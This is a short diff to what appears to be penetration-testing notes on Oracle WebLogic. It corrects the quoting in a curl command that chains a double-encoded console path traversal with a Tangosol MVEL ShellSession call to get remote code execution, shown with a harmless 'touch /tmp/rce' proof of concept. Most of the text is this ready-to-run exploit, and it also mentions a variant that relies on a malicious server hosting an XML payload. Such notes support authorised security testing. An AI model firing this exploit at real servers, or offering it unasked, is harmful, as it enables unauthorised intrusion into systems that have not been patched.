@@ -30,7 +30,7 @@ There are loads of other RCEs spanning 2017-2020 but this one is so easy and pow
 If Tangosol is present on the target (versions >=12 usually) then direct remote code execution is achieved:
 ```bash
 curl -X POST 'http://target:7001/console/css/%252e%252e%252fconsole.portal'
-    --data '_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/rce');")'
+    --data '_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec(%27touch%20/tmp/rce%27);")'
 ```
 
 Otherwise an additional malicious webserver hosting a XML paylod is needed, but RCE is achieved nonetheless.
